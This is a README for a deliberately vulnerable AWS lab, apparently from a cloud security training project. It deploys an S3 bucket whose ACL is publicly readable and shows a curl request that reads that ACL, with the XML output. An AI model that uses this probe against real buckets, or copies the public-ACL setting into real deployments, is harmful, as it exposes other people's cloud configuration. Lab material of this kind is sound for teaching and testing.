# AWS S3 Bucket ACL readable vulnerability environment

English | [中文](./README_CN.md)

## Description

This is the scenario in which the AWS S3 bucket ACL is readable.

## Deployment Environment

Execute the following command in the container

```shell
cd /TerraformGoat/aws/s3/bucket_acl_readable
```

Configure AWS Access Credentials

```shell
aws configure
```

> You can see the access key in the AWS [Console --> Security Credentials]

Deploy Vulnerable Environment

```shell
terraform init
terraform apply
```

> When the terminal prompts `Enter a value:`, enter `yes`

After the environment is set up, you can see the created Bucket at Outputs.

## Vulnerability Utilization

Get Bucket ACL policy.

```shell
> curl https://houxian-xxx.s3.us-east-1.amazonaws.com/?acl -s | xmllint --format -

<?xml version="1.0" encoding="UTF-8"?>
<AccessControlPolicy xmlns="http://s3.amazonaws.com/doc/2006-03-01/">
  <Owner>
    <ID>xxx</ID>
    <DisplayName>xxx</DisplayName>
  </Owner>
  <AccessControlList>
    <Grant>
      <Grantee xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="Group">
        <URI>http://acs.amazonaws.com/groups/global/AllUsers</URI>
      </Grantee>
      <Permission>READ_ACP</Permission>
    </Grant>
    <Grant>
      <Grantee xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="CanonicalUser">
        <ID>xxx</ID>
        <DisplayName>xxx</DisplayName>
      </Grantee>
      <Permission>FULL_CONTROL</Permission>
    </Grant>
  </AccessControlList>
</AccessControlPolicy>
```

## Destroy the environment

```shell
terraform destroy
```
